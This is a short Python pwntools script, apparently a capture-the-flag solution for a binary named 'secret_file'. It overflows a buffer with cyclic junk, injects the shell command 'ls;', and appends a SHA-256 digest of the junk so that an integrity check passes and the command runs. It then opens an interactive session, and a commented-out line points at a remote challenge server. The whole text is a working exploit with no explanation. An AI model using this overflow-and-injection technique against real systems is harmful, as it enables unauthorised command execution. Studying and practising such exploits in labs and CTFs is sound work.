from pwn import *
from hashlib import sha256

r = process("./secret_file")
# r = remote("111.200.241.244", 57956)
junk = cyclic(0x100)
payload = junk + b"ls;".ljust(27, b" ") + sha256(junk).hexdigest().encode("utf-8")
r.sendline(payload)
r.interactive()
